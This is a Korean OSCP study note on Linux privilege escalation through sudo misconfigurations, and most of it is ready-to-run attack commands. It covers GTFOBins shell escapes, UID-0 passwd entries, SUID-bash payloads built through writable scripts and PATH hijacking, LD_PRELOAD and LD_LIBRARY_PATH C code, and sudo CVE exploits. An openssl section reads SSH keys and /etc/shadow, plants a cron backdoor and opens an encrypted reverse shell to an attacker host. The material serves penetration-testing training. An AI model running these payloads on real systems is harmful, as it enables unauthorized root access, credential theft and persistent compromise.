# 02_sudo악용

# 리눅스 권한상승 — sudo 악용

---

## 개념

sudo 악용은 `sudo -l` 결과에서 현재 사용자가 root 권한으로 실행할 수 있는 명령을 찾고, 그 명령의 기능을 이용해 권한상승으로 이어가는 방식이다. 핵심은 “어떤 명령을 root로 실행할 수 있는가”와 “그 명령이 쉘 실행·명령 실행·파일 쓰기·파일 읽기 중 무엇을 할 수 있는가”를 연결하는 것이다.

OSCP에서는 `sudo -l` 결과에 나온 바이너리를 보고 GTFOBins의 `Sudo` 섹션을 확인하는 흐름이 가장 빠르다. 단, 모든 sudo 권한이 바로 쉘로 이어지는 것은 아니므로, 허용된 명령이 단순 실행형인지, 편집기인지, pager인지, 스크립트인지, 파일 쓰기 도구인지 먼저 분류한다.

```bash
# 시작점
sudo -l
sudo -V

# 현재 권한 확인
id
whoami

# sudo -l에서 우선 확인할 키워드
NOPASSWD
SETENV
env_keep
LD_PRELOAD
LD_LIBRARY_PATH
(ALL, !root)
```

---

## 기본 확인

`sudo -l`은 현재 사용자가 어떤 명령을 어떤 사용자 권한으로 실행할 수 있는지 보여준다. `NOPASSWD`가 있으면 비밀번호 없이 바로 실행 가능하고, `(root)`가 보이면 해당 명령이 root 권한으로 실행된다.

`sudo -V`는 sudo 버전을 확인할 때 사용한다. 버전이 낮으면 CVE-2019-14287, CVE-2021-3156 같은 sudo 자체 취약점도 후보가 된다.

```bash
# sudo 권한 확인
sudo -l

# sudo 버전 확인
sudo -V

# 자주 보이는 sudo -l 출력 예시
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /bin/cp
(root) NOPASSWD: /opt/backup.sh
(ALL, !root) ALL

# 환경변수 관련 출력 예시
Defaults env_keep += "LD_PRELOAD"
Defaults env_keep += "LD_LIBRARY_PATH"
Defaults SETENV

# 바로 root shell 가능한 강한 권한 예시
(ALL) ALL
(root) ALL

# 위처럼 전체 sudo가 가능하면 우선 시도
sudo su
sudo -i
sudo /bin/bash
```

---

## sudo -l 결과 분류

`sudo -l` 결과를 봤을 때 바로 명령어를 치기보다 먼저 유형을 나누면 실수가 줄어든다. 편집기, pager, 인터프리터, 파일 쓰기 도구는 GTFOBins로 바로 이어지는 경우가 많다.

스크립트가 허용된 경우에는 GTFOBins보다 스크립트 분석이 먼저다. 스크립트 자체가 writable인지, 내부에서 상대경로 명령을 호출하는지, 다른 파일을 source/include 하는지 확인한다.

```bash
# 1. 편집기 계열
/usr/bin/vim
/usr/bin/vi
/bin/nano
# → 내부 명령 실행 또는 파일 편집 기능 확인

# 2. pager 계열
/usr/bin/less
/usr/bin/more
/usr/bin/man
# → !sh, !/bin/sh 같은 pager escape 확인

# 3. 인터프리터 계열
/usr/bin/python
/usr/bin/python3
/usr/bin/perl
/usr/bin/ruby
/usr/bin/lua
/usr/bin/awk
# → 한 줄 코드 실행으로 /bin/sh 호출

# 4. 파일 쓰기 계열
/usr/bin/tee
/bin/cp
# → /etc/passwd, authorized_keys, sudoers.d, config 파일 쓰기 가능성

# 5. 스크립트 계열
/opt/backup.sh
/usr/local/bin/check.sh
# → 권한, 내용, PATH hijacking, writable include 파일 확인

# 6. sudo 자체 취약점 후보
(ALL, !root) ALL
sudo < 1.8.28
sudo < 1.9.5p2
```

---

## GTFOBins 확인

GTFOBins는 리눅스 바이너리가 권한상승에 어떻게 악용될 수 있는지 정리한 사이트다. `sudo -l`에 나온 바이너리를 검색하고 `Sudo` 섹션을 확인한다.

주의할 점은 sudoers가 절대경로로 제한된 경우다. 예를 들어 `/usr/bin/find`만 허용되어 있으면 `sudo find`가 실패할 수 있으므로, `sudo /usr/bin/find`처럼 출력된 경로를 그대로 맞춰 실행한다.

```bash
# 사이트
https://gtfobins.github.io

# 확인 흐름
sudo -l

# 예시 출력
(root) NOPASSWD: /usr/bin/find

# GTFOBins에서 find 검색 → Sudo 섹션 확인
# sudoers 경로와 맞춰 실행
sudo /usr/bin/find ...

# 잘못된 실행 예시: sudoers에서 절대경로만 허용하면 실패할 수 있음
sudo find ...

# 실패 시 자주 보는 메시지
Sorry, user user is not allowed to execute '/usr/bin/find ...'
```

---

## GTFOBins에 없는 애플리케이션 전용 바이너리

`sudo -l`에 나온 바이너리가 GTFOBins 목록에 없다고 끝난 게 아니다. 회사/제품이 자체적으로 만든 CLI 관리 도구(CMS 배포 도구, 백업 스크립트, 커스텀 배치 유틸리티 등)도 원리는 GTFOBins와 동일하다 — **임의 코드를 실행할 수 있는 기능(eval, exec, plugin/hook 실행, 셀 아웃 등)이 있으면 그게 곳 sudo 악용 지점**이다.

```bash
# 1. GTFOBins에 없는 바이너리부터 --help/-h로 기능 확인
sudo /usr/local/bin/<커스텀도구> --help
sudo /usr/local/bin/<커스텀도구> help

# 2. 찾아야 할 키워드 (도구마다 이름이 다름)
eval, exec, run, script, --php, --code, sh, shell, system, callback, hook, plugin

# 3. 실제 사례 — CMS 자체 관리 CLI(bee)의 eval 서브커맨드 악용
# sudo -l 예시: (root) ALL : ALL /usr/local/bin/bee
sudo /usr/local/bin/bee --root='<웹루트경로>' ev 'SYSTEM("sh")'   # ← 수정, ev = eval

# 4. --help로 안 나오면 소스/문서 확인
cat /usr/local/bin/<커스텀도구>       # 스크립트면 바로 읽힘
strings /usr/local/bin/<커스텀도구> | grep -iE "eval|exec|system|shell"  # 컴파일된 바이너리면
```

이 원칙은 CTF/랩보다 **실전(회사 자체 개발 도구가 많은 환경)에서 훨씬 자주 마주친다** — GTFOBins에서 안 나온다고 포기하지 말고, 도구 자체의 기능 목록을 먼저 훑어볼 것.

---

## Sudo — Writable Script

`sudo -l`에서 특정 스크립트를 root 권한으로 실행할 수 있고, 현재 사용자가 그 스크립트를 수정할 수 있으면 파일 끝에 shell 실행 명령을 추가하여 root shell을 얻을 수 있다.

핵심은 스크립트 이름이나 원래 기능이 아니라, **사용자가 수정 가능한 파일이 더 높은 권한으로 실행된다는 잘못된 권한 설정**이다. 실제 환경에서는 스크립트 경로를 `sudo -l` 결과에 맞게 바꿔야 한다.

```bash
# sudo -l 예시
(root) NOPASSWD: /path/to/script.sh

# 파일 소유권과 쓰기 권한 확인
ls -l /path/to/script.sh

# 현재 사용자가 실제로 쓸 수 있는지 확인
test -w /path/to/script.sh && echo writable

# 원본 백업
cp /path/to/script.sh /tmp/script.sh.bak

# 스크립트 끝에 root shell 실행 명령 추가
echo '/bin/bash' >> /path/to/script.sh

# sudoers에 허용된 정확한 경로로 실행
sudo /path/to/script.sh

# 성공 확인
id
whoami

# 성공 시 기대 출력 예시
uid=0(root) gid=0(root) groups=0(root)
root
```

---

## GTFOBins — find

`find`는 파일 검색 도구지만 `-exec` 옵션으로 외부 명령을 실행할 수 있다. root 권한으로 `find`를 실행할 수 있으면 `-exec /bin/sh`를 통해 root shell을 실행할 수 있다.

`-quit`은 첫 번째 매치 이후 find를 종료하게 해서 쉘이 뜬 뒤 불필요하게 find가 계속 도는 것을 막는다. `/etc`처럼 반드시 존재하는 경로를 대상으로 잡으면 빠르게 실행된다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/find

# 기본 실행
sudo /usr/bin/find /etc -exec /bin/sh \; -quit

# sudoers가 경로 제한을 안 하면 가능
sudo find /etc -exec /bin/sh \; -quit

# 다른 조건을 써야 할 때
sudo /usr/bin/find / -name passwd -exec /bin/sh \; 2>/dev/null

# 성공 확인
id
whoami

# 성공 시 기대 출력 예시
uid=0(root) gid=0(root) groups=0(root)
root
```

---

## GTFOBins — vim

`vim`은 편집기지만 내부 명령 모드에서 외부 명령을 실행할 수 있다. root 권한으로 vim을 열 수 있으면 `:!/bin/sh`를 통해 root shell로 빠질 수 있다.

vim은 TTY 상태가 꼬일 때가 있으므로, 쉘이 뜬 뒤 입력이 이상하면 `reset`을 사용한다. Python3 지원 vim이면 `os.execl()` 방식이 더 안정적으로 동작할 때가 있다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/vim

# 실행과 동시에 shell 호출
sudo /usr/bin/vim -c ':!/bin/sh'

# vim 내부에서 직접 실행하는 방식
sudo /usr/bin/vim
:!/bin/sh

# python3 지원 vim일 때
sudo /usr/bin/vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset;exec sh -p")'

# shell이 떴는데 화면이 깨질 때
reset

# 확인
id
whoami
```

---

## GTFOBins — vi

`vi`도 vim과 같은 방식으로 내부 명령 모드에서 외부 명령을 실행할 수 있다. `sudo -l`에 vim이 아니라 vi만 허용되어 있으면 vi 기준으로 시도한다.

환경에 따라 vi가 vim의 심볼릭 링크일 수도 있고, 기능이 제한된 vi일 수도 있다. `:!/bin/sh`가 막히면 다른 허용 바이너리나 파일 쓰기 방향을 본다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/vi

# 실행과 동시에 shell 호출
sudo /usr/bin/vi -c ':!/bin/sh'

# vi 내부에서 직접 실행
sudo /usr/bin/vi
:!/bin/sh

# 확인
id
whoami

# 실패 시 볼 수 있는 상황
# - restricted shell
# - shell command not allowed
# - vi 기능 제한
```

---

## GTFOBins — nano

`nano`는 단순 편집기처럼 보이지만 파일 삽입 기능과 명령 실행 기능을 통해 shell을 실행할 수 있다. sudo로 nano가 실행되면 해당 기능으로 열린 shell도 root 권한이 된다.

nano는 키 입력 순서가 중요하다. 먼저 `Ctrl+R`로 파일 읽기 기능을 열고, 그 상태에서 `Ctrl+X`를 눌러 명령 실행 입력으로 넘어간다.

```bash
# sudo -l 예시
(root) NOPASSWD: /bin/nano

# 실행
sudo /bin/nano

# nano 안에서 입력 순서
Ctrl+R
Ctrl+X

# 명령 입력
reset; sh 1>&0 2>&0

# 확인
id
whoami

# 입력이 깨지면 시도
reset
stty sane
```

---

## GTFOBins — awk

`awk`는 텍스트 처리 도구지만 `system()` 함수로 외부 명령을 실행할 수 있다. sudo로 awk 실행이 가능하면 `BEGIN` 블록에서 `/bin/sh`를 호출해 root shell을 얻는다.

`BEGIN` 블록은 입력 파일을 읽기 전에 먼저 실행되므로 별도 파일이 없어도 바로 명령 실행이 가능하다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/awk

# 실행
sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'

# 경로 제한이 없을 때
sudo awk 'BEGIN {system("/bin/sh")}'

# 확인
id
whoami

# 기대 출력
uid=0(root)
root
```

---

## GTFOBins — perl

`perl`은 `-e` 옵션으로 한 줄 코드를 실행할 수 있고, `exec`로 현재 프로세스를 shell로 교체할 수 있다. sudo로 perl이 허용되어 있으면 매우 직접적인 root shell 방법이다.

`exec`는 perl 프로세스를 `/bin/sh`로 바꾸는 방식이라 불필요한 자식 프로세스를 만들지 않고 바로 쉘로 전환된다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/perl

# 실행
sudo /usr/bin/perl -e 'exec "/bin/sh"'

# 확인
id
whoami

# /bin/bash가 필요할 때
sudo /usr/bin/perl -e 'exec "/bin/bash"'
```

---

## GTFOBins — python

`python`은 `os.system()`이나 `os.execl()`로 shell을 실행할 수 있다. sudo로 python이 허용되어 있으면 인터프리터 내부에서 `/bin/sh`를 실행해 root shell로 이어진다.

`os.system()`은 shell 명령을 실행하고, `os.execl()`은 현재 python 프로세스를 shell로 교체한다. 둘 중 하나가 불안정하면 다른 방식을 시도한다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/python

# os.system 방식
sudo /usr/bin/python -c 'import os; os.system("/bin/sh")'

# execl 방식
sudo /usr/bin/python -c 'import os; os.execl("/bin/sh","sh")'

# bash 사용 가능 시
sudo /usr/bin/python -c 'import os; os.system("/bin/bash")'

# 확인
id
whoami
```

---

## GTFOBins — python3

`python3`도 python과 동일하게 os 모듈을 이용해 shell을 실행할 수 있다. 대상 시스템에는 python2가 없고 python3만 있는 경우가 많으므로 따로 확인한다.

실제 시험에서는 `which python`, `which python3`로 존재 여부를 확인하고, sudoers에 나온 경로와 정확히 맞춰 실행한다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/python3

# 존재 여부 확인
which python3

# os.system 방식
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'

# execl 방식
sudo /usr/bin/python3 -c 'import os; os.execl("/bin/sh","sh")'

# 확인
id
whoami
```

---

## GTFOBins — ruby

`ruby`는 `-e` 옵션으로 코드를 실행할 수 있고, `exec`로 shell을 실행할 수 있다. perl/python과 같은 인터프리터 계열이라 sudo 허용 시 바로 root shell 후보가 된다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/ruby

# 실행
sudo /usr/bin/ruby -e 'exec "/bin/sh"'

# bash 사용 가능 시
sudo /usr/bin/ruby -e 'exec "/bin/bash"'

# 확인
id
whoami
```

---

## GTFOBins — lua

`lua`는 `os.execute()`로 외부 명령을 실행할 수 있다. sudo로 lua가 허용되어 있으면 `/bin/sh`를 root 권한으로 실행할 수 있다.

Lua가 설치된 시스템은 많지 않지만, sudoers에 명시되어 있으면 매우 간단한 권한상승 루트가 된다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/lua

# 실행
sudo /usr/bin/lua -e 'os.execute("/bin/sh")'

# bash 사용 가능 시
sudo /usr/bin/lua -e 'os.execute("/bin/bash")'

# 확인
id
whoami
```

---

## GTFOBins — less

`less`는 pager 내부에서 `!sh`로 외부 shell을 실행할 수 있다. sudo로 less가 실행되면 pager 자체가 root 권한이므로, 그 안에서 실행한 shell도 root 권한이 된다.

파일은 아무거나 열어도 되지만, 존재하는 텍스트 파일을 지정해야 pager가 열린다. `/etc/profile`, `/etc/hosts`, `/etc/passwd` 같은 파일을 자주 사용한다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/less

# 실행
sudo /usr/bin/less /etc/profile

# less 안에서 입력
!sh

# bash가 필요하면
!/bin/bash

# 확인
id
whoami
```

---

## GTFOBins — more

`more`도 pager로 동작하며 환경에 따라 `!sh` 입력으로 shell 실행이 가능하다. less보다 제한적일 수 있지만, sudoers에 more만 허용된 경우 시도할 가치가 있다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/more

# 실행
sudo /usr/bin/more /etc/profile

# more 안에서 입력
!sh

# 확인
id
whoami

# !sh가 안 먹으면 less/man 등 다른 pager 계열 확인
```

---

## GTFOBins — man

`man`은 매뉴얼 페이지를 보여줄 때 pager를 사용한다. pager가 less라면 `!sh`를 통해 root shell로 빠질 수 있다.

직접 shell 실행 기능이 man에 있는 것이 아니라, man이 호출한 pager를 악용하는 방식이다. 따라서 pager 환경에 따라 동작이 달라질 수 있다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/man

# 실행
sudo /usr/bin/man man

# man 페이지 안에서 입력
!sh

# bash가 필요하면
!/bin/bash

# 확인
id
whoami
```

---

## GTFOBins — tar

`tar`는 압축/아카이브 도구지만 옵션을 통해 외부 프로그램을 호출할 수 있다. sudo로 tar가 허용되어 있으면 외부 프로그램 호출 기능을 이용해 shell을 실행한다.

`-I` 옵션은 압축 프로그램을 지정하는 옵션이다. 여기에 `/bin/sh -c ...`를 넣어 shell을 호출한다.

```bash
# sudo -l 예시
(root) NOPASSWD: /bin/tar

# 실행
sudo /bin/tar -cf /dev/null /tmp -I '/bin/sh -c "sh <&2 1>&2"'

# 명령 구성
-cf /dev/null
/tmp
-I '/bin/sh -c "sh <&2 1>&2"'

# 확인
id
whoami
```

---

## GTFOBins — zip

`zip`은 테스트 명령 옵션을 통해 외부 명령을 실행할 수 있다. sudo로 zip 실행이 가능하면 테스트 명령에 shell을 지정한다.

`-T`는 zip 파일 테스트, `-TT`는 테스트에 사용할 명령을 지정한다. 임시로 압축할 파일이 필요하므로 `/tmp/t` 같은 파일을 만든다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/zip

# 임시 파일 생성
touch /tmp/t

# 실행
sudo /usr/bin/zip /tmp/t.zip /tmp/t -T -TT 'sh #'

# 확인
id
whoami

# 생성 파일 확인
ls -la /tmp/t /tmp/t.zip
```

---

## GTFOBins — git

`git`은 help나 pager 기능을 통해 shell 실행으로 빠질 수 있다. sudo로 git이 실행되고 pager가 열리면 `!/bin/sh`를 입력해 root shell을 얻는다.

이 방식은 git 자체가 shell을 실행한다기보다, git이 호출한 pager의 escape 기능을 사용하는 방식이다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/git

# pager 열기
sudo /usr/bin/git -p help config

# pager 안에서 입력
!/bin/sh

# bash가 필요하면
!/bin/bash

# 확인
id
whoami
```

---

## GTFOBins — nmap

구버전 nmap은 interactive 모드에서 shell 실행이 가능하다. 최신 nmap에서는 `--interactive` 옵션이 제거되어 있을 수 있으므로 실패하면 버전과 옵션을 확인한다.

이 기법은 오래된 머신에서만 기대할 수 있다. OSCP 구형 박스나 레거시 환경에서 sudoers에 nmap이 보이면 확인한다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/nmap

# 버전 확인
/usr/bin/nmap --version

# interactive 모드 실행
sudo /usr/bin/nmap --interactive

# nmap 프롬프트에서 입력
!sh

# 확인
id
whoami

# 옵션이 없을 때 예상 출력
nmap: unrecognized option '--interactive'
```

---

## GTFOBins — env

`env`는 지정한 프로그램을 실행하는 명령이다. sudo로 env가 허용되어 있으면 env를 통해 shell을 root 권한으로 실행할 수 있다.

가장 단순한 sudo misconfiguration 중 하나다. `/bin/sh`, `/bin/bash` 중 대상에 존재하는 것을 사용한다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/env

# sh 실행
sudo /usr/bin/env /bin/sh

# bash 실행
sudo /usr/bin/env /bin/bash

# 확인
id
whoami

# shell 확인
ps -p $$
```

---

## GTFOBins — openssl

`openssl`은 암호화/인증서 처리 도구지만, `enc` 서브커맨드가 사실상 범용 파일 복사 도구처럼 동작한다. 암호화 알고리즘을 지정하지 않으면 입력을 그대로 통과시키기 때문에, sudo로 openssl이 허용되어 있으면 root shell을 직접 띄우기보다 **특권 파일 읽기/쓰기**에 주로 쓰인다. SUID 비트가 걸려 있는 경우에도 동일한 원리로 파일 읽기/쓰기가 가능하다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/openssl

# 방법 1 — 파일 직접 읽기
LFILE=/root/.ssh/id_rsa
sudo openssl enc -in "$LFILE"
# -out을 지정하지 않으면 결과가 화면에 그대로 출력됨

# 방법 2 — base64로 감싸서 안전하게 읽기 (바이너리/특수문자 파일에 유용)
sudo openssl enc -in "$LFILE" -out /tmp/leaked -base64
cat /tmp/leaked | base64 -d

# 방법 3 — 파일 쓰기 (root 권한으로 임의 파일 생성/덮어쓰기)
sudo openssl enc -in /tmp/malicious -out /etc/cron.d/backdoor

# SUID 컨텍스트에서도 동일하게 동작 (sudo가 아니라 SUID 비트인 경우)
ls -la $(which openssl)   # -rwsr-xr-x 면 SUID
LFILE=/etc/shadow
openssl enc -in "$LFILE"  # sudo 없이도 파일 읽기 가능
```

### 고난이도 — 암호화 리버스쉘

`openssl s_client`/`s_server`로 TLS 세션을 만들어 리버스쉘 트래픽 자체를 암호화할 수 있다. 평문 `nc` 리버스쉘이 IDS/트래픽 검사에 걸리는 환경에서 유용하다.

```bash
# 공격자(칼리) — TLS 인증서 생성 + 리스너
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port <포트>   # ← 수정

# 대상 — 암호화된 리버스쉘 전송
mkfifo /tmp/s
/bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect <칼리IP>:<포트> > /tmp/s; rm /tmp/s   # ← 수정
```

---

## 파일 쓰기 — tee

`tee`는 표준입력을 파일에 쓰는 명령이다. sudo로 tee가 허용되어 있으면 root 권한 파일에 내용을 추가할 수 있다.

`/etc/passwd` 수정은 시스템을 망가뜨릴 수 있으므로 마지막 수단으로만 사용한다. 가능하면 `/root/.ssh/authorized_keys`, `/etc/sudoers.d/`, 서비스 설정 파일처럼 목적이 명확하고 복구가 쉬운 파일 쓰기부터 확인한다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/tee

# /etc/passwd 백업
cp /etc/passwd /tmp/passwd.bak

# UID 0 사용자 추가 예시
# 주의: 빈 패스워드 로그인이 막혀 있을 수 있음
echo 'root2::0:0:root:/root:/bin/bash' | sudo /usr/bin/tee -a /etc/passwd

# 로그인 시도
su root2

# 확인
id
whoami

# 복구가 필요한 경우
sudo cp /tmp/passwd.bak /etc/passwd
```

---

## 파일 쓰기 — cp

`cp`를 sudo로 실행할 수 있으면 root-owned 파일을 덮어쓸 수 있다. `/etc/passwd` 교체, SSH authorized_keys 삽입, sudoers.d 파일 생성 같은 방향으로 이어질 수 있다.

시스템 파일을 덮어쓸 때는 반드시 백업을 먼저 만든다. 시험 중에는 성공 이후 보고서 증거를 남긴 뒤, 불필요하게 시스템을 망가뜨리지 않는 쪽이 좋다.

```bash
# sudo -l 예시
(root) NOPASSWD: /bin/cp

# 백업
cp /etc/passwd /tmp/passwd.bak

# 공격용 passwd 준비
cp /etc/passwd /tmp/evil_passwd
vi /tmp/evil_passwd

# /tmp/evil_passwd에 추가할 예시 라인
root2::0:0:root:/root:/bin/bash

# 교체
sudo /bin/cp /tmp/evil_passwd /etc/passwd

# 로그인 시도
su root2

# 확인
id
whoami

# 복구가 필요한 경우
sudo /bin/cp /tmp/passwd.bak /etc/passwd
```

---

## GTFOBins — tcpdump

`tcpdump`는 rotate 후 실행할 명령을 지정할 수 있다. sudo로 tcpdump가 허용되어 있으면 `-z` 옵션으로 스크립트를 실행해 SUID bash를 만들 수 있다.

`-G1`, `-W1`로 빠르게 rotate가 발생하게 만들고, `-z`에 실행할 스크립트를 지정한다. 실행 후 `/tmp/bash -p`로 effective root 권한을 유지한 bash를 실행한다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/sbin/tcpdump

# 페이로드 스크립트 생성
cat > /tmp/shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
EOF
chmod +x /tmp/shell.sh

# tcpdump 실행
sudo /usr/sbin/tcpdump -ln -i lo -G1 -w /dev/null -W 1 -z /tmp/shell.sh -Z root

# SUID bash 실행
/tmp/bash -p

# 확인
id
whoami
ls -la /tmp/bash
```

---

## sudo 스크립트 악용

sudo로 바이너리가 아니라 스크립트를 실행할 수 있으면 GTFOBins보다 스크립트 분석이 먼저다. 스크립트 자체가 writable이면 직접 페이로드를 넣을 수 있고, 내부에서 상대경로 명령을 호출하면 PATH hijacking이 가능할 수 있다.

또한 스크립트가 다른 파일을 `source`, `.`, `include` 하는 경우 그 파일의 쓰기 권한도 확인한다. root가 실행하는 흐름 안에 내가 수정 가능한 파일이 들어가면 권한상승 포인트가 된다.

```bash
# sudo -l 예시
(root) NOPASSWD: /opt/backup.sh

# 권한 확인
ls -la /opt/backup.sh
stat /opt/backup.sh

# 내용 확인
cat /opt/backup.sh

# writable 스크립트일 때
cp /opt/backup.sh /tmp/backup.sh.bak
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/backup.sh
sudo /opt/backup.sh
/tmp/bash -p

# 확인
id
whoami
```

---

## PATH hijacking

sudo로 실행되는 스크립트가 `tar`, `cp`, `gzip`, `service` 같은 명령을 절대경로 없이 호출하면 PATH 조작으로 악성 명령을 먼저 실행시킬 수 있다.

단, sudoers에 `secure_path`가 설정되어 있으면 사용자가 export한 PATH가 무시될 수 있다. 이 경우에는 스크립트 자체 writable, 호출되는 파일 writable, 환경변수 허용 여부를 다시 확인한다.

```bash
# 예시 스크립트 내용 확인
cat /opt/backup.sh

# 문제되는 형태 예시
# tar -czf /tmp/backup.tar.gz /var/www
# cp file1 file2
# gzip backup.txt

# 악성 tar 생성
cat > /tmp/tar << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
EOF
chmod +x /tmp/tar

# PATH 조작
export PATH=/tmp:$PATH
which tar

# sudo 스크립트 실행
sudo /opt/backup.sh

# SUID bash 실행
/tmp/bash -p

# 확인
id
whoami
ls -la /tmp/bash
```

---

## CVE-2019-14287 — sudo < 1.8.28

sudo 1.8.28 미만에서 `(ALL, !root) ALL` 같은 설정이 있으면 UID 우회로 root 실행이 가능할 수 있다. 설정상 root를 제외한다고 되어 있어도 취약한 sudo에서는 `-u#-1`, `-u#4294967295`가 root로 해석될 수 있다.

이 기법은 sudoers 조건과 sudo 버전이 모두 맞아야 한다. 단순히 sudo 버전만 낮다고 무조건 되는 것은 아니다.

```bash
# 조건 확인
sudo -V
sudo -l

# sudo -l 예시
(ALL, !root) ALL

# 실행
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash

# 확인
id
whoami

# 기대 출력
uid=0(root)
root
```

---

## CVE-2021-3156 — Baron Samedit

sudo 1.9.5p2 미만에서 발생한 sudoedit 힙 오버플로우 취약점이다. OS, libc, sudo 빌드 환경에 따라 PoC 성공 여부가 크게 달라진다.

취약 여부 확인에서 segmentation fault가 나와도 exploit 성공이 보장되는 것은 아니다. OSCP에서는 커널/로컬 PoC 계열과 마찬가지로 실패 가능성을 고려하고, 먼저 sudoers misconfiguration을 확인한다.

```bash
# 버전 확인
sudo -V

# 취약 여부 간단 확인
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# 취약 의심 출력
Segmentation fault

# PoC 예시
git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich 0

# 확인
id
whoami
```

---

## LD_PRELOAD

`sudo -l` 결과에 `env_keep+=LD_PRELOAD`가 있으면 sudo 실행 시 LD_PRELOAD 환경변수가 제거되지 않는다. 이 경우 악성 shared object를 먼저 로드해 root 권한 코드를 실행할 수 있다.

조건은 두 가지다. 첫째, `env_keep+=LD_PRELOAD`가 보여야 한다. 둘째, 실제로 sudo로 실행 가능한 명령이 하나 이상 있어야 한다.

```c
// /tmp/preload.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# sudo -l 예시
Defaults env_keep += "LD_PRELOAD"
(root) NOPASSWD: /usr/sbin/apache2

# 컴파일
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles

# 실행
sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2

# 확인
id
whoami
```

---

## LD_LIBRARY_PATH

`sudo -l` 결과에 `env_keep+=LD_LIBRARY_PATH`가 있으면 라이브러리 로딩 경로를 조작할 수 있다. sudo로 실행 가능한 바이너리가 동적 라이브러리를 로드할 때 사용한다.

`ldd`로 대상 바이너리가 어떤 라이브러리를 로드하는지 확인하고, 그중 하나와 같은 이름의 악성 shared object를 만들어 `/tmp` 같은 경로에서 먼저 로드되게 한다.

```bash
# sudo -l 예시
Defaults env_keep += "LD_LIBRARY_PATH"
(root) NOPASSWD: /usr/sbin/apache2

# 라이브러리 확인
ldd /usr/sbin/apache2

# 출력 예시
libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
```

```c
// /tmp/libcrypt.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void hijack() __attribute__((constructor));
void hijack() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# ldd에서 확인한 라이브러리명에 맞춰 생성
gcc -shared -fPIC -o /tmp/libcrypt.so.1 /tmp/libcrypt.c

# 실행
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2

# 확인
id
whoami
```

---

## 마무리 확인

root 권한을 얻으면 바로 권한과 플래그를 확인한다. 이후 어떤 명령으로 권한상승했는지, 어떤 sudoers 설정이 원인이었는지 보고서에 남길 수 있게 증거를 확보한다.

시스템 파일을 수정했거나 SUID bash를 만들었다면 필요한 경우 흔적도 확인한다. 특히 `/etc/passwd`를 건드린 경우 백업 파일을 만들어두는 것이 중요하다.

```bash
# 권한 확인
id
whoami
hostname

# 플래그 확인
cat /root/proof.txt 2>/dev/null
cat /root/root.txt 2>/dev/null

# SUID bash 확인
ls -la /tmp/bash 2>/dev/null

# sudo 설정 증거
sudo -l

# /etc/passwd 백업 복구가 필요한 경우
sudo cp /tmp/passwd.bak /etc/passwd
```